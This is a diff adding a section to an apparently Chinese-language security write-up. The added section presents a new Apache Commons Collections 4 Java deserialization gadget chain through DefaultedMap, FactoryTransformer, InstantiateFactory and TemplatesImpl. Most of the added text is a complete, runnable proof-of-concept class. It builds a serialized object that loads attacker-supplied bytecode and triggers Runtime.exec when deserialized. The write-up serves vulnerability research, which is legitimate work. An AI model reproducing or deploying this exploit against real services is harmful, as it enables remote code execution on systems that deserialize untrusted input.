@@ -198,3 +198,123 @@ public class CommonsCollections4New3 {
 
 前面通过查询结果可以看到并不止这么一条，例如另一条通过`InstantiateFactory`实例化恶意字节码的新链子，不过因为题目过滤了`TemplatesImpl`类所以也没有兴趣去实现，粗看是能实现的，有兴趣的师傅可以自行实现。
 ![image-20221212113600892](images/image-20221212113600892.png)
+
+好吧还是实现一下，不过这里我没有用`CloneTransformer`类，我把上图中的链子修改为如下所示：
+```
+Gadget chain:
+	    java.io.ObjectInputStream.readObject()
+            java.util.HashMap.readObject()
+                java.util.HashMap.hash()
+                    org.apache.commons.collections4.keyvalue.TiedMapEntry.hashCode()
+                    org.apache.commons.collections4.keyvalue.TiedMapEntry.getValue()
+                        org.apache.commons.collections4.map.DefaultedMap.get()
+                            org.apache.commons.collections4.functors.FactoryTransformer.transform()
+                                org.apache.commons.collections4.functors.InstantiateFactory.create()
+                                    newInstance()
+                                        TrAXFilter#TrAXFilter()
+                                        TemplatesImpl.newTransformer()
+                                            TemplatesImpl.getTransletInstance()
+                                            TemplatesImpl.defineTransletClasses
+                                            newInstance()
+                                                Runtime.exec()
+```
+
+实现
+```java
+package com.serialize;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.functors.FactoryTransformer;
+import org.apache.commons.collections4.functors.InstantiateFactory;
+import org.apache.commons.collections4.keyvalue.TiedMapEntry;
+import org.apache.commons.collections4.map.DefaultedMap;
+
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+/**
+ * Created by dotast on 2022/12/12 16:33
+ */
+public class CommonsCollections4New2 {
+    public static void main(String[] args) throws Exception{
+        CommonsCollections4New2 commonsCollections4New2 = new CommonsCollections4New2();
+        commonsCollections4New2.serialize();
+        commonsCollections4New2.unserialize();
+    }
+
+    public void serialize() throws Exception {
+        byte[] classBytes = getBytes();
+        byte[][] targetByteCodes = new byte[][]{classBytes};
+        // 反射修改
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+        Field bytecodes = templates.getClass().getDeclaredField("_bytecodes");
+        bytecodes.setAccessible(true);
+        bytecodes.set(templates, targetByteCodes);
+
+        Field name = templates.getClass().getDeclaredField("_name");
+        name.setAccessible(true);
+        name.set(templates, "name");
+
+        Field _class = templates.getClass().getDeclaredField("_class");
+        _class.setAccessible(true);
+        _class.set(templates, null);
+
+        Field _tfactory = templates.getClass().getDeclaredField("_tfactory");
+        _tfactory.setAccessible(true);
+        _tfactory.set(templates,new TransformerFactoryImpl());
+        // 利用链
+        InstantiateFactory instantiateFactory = new InstantiateFactory(TrAXFilter.class, new Class[]{Templates.class}, new Object[]{templates});
+
+
+        FactoryTransformer factoryTransformer = new FactoryTransformer(instantiateFactory);
+
+
+        // 通过反射实例化DefaultedMap类
+        Map innerMap = new HashMap<>();
+        Class cls = Class.forName("org.apache.commons.collections4.map.DefaultedMap");
+        Constructor constructor = cls.getDeclaredConstructor(Map.class, Transformer.class);
+        constructor.setAccessible(true);
+        Map defaultedMap = (DefaultedMap)constructor.newInstance(innerMap, factoryTransformer);
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(defaultedMap,templates);
+        Map expMap = new HashMap<>();
+        expMap.put(tiedMapEntry,"valueTest");
+
+
+        FileOutputStream fileOutputStream = new FileOutputStream("1.txt");
+        // 创建并实例化对象输出流
+        ObjectOutputStream out = new ObjectOutputStream(fileOutputStream);
+        out.writeObject(expMap);
+    }
+    /*
+     * 服务端
+     *  */
+    public void unserialize() throws Exception{
+        // 创建并实例化文件输入流
+        FileInputStream fileInputStream = new FileInputStream("1.txt");
+        // 创建并实例化对象输入流
+        ObjectInputStream in = new ObjectInputStream(fileInputStream);
+        in.readObject();
+    }
+
+    public static byte[] getBytes() throws Exception{
+        InputStream inputStream = new FileInputStream(new File("./target/classes/com/test/tool/ExecEvilClass.class"));
+        ByteArrayOutputStream bao = new ByteArrayOutputStream();
+        int a = -1;
+        while((a = inputStream.read())!=-1){
+            bao.write(a);
+        }
+        byte[] bytes = bao.toByteArray();
+        return bytes;
+
+    }
+}
+```
+
+![image-20221212163257816](images/image-20221212163257816.png)
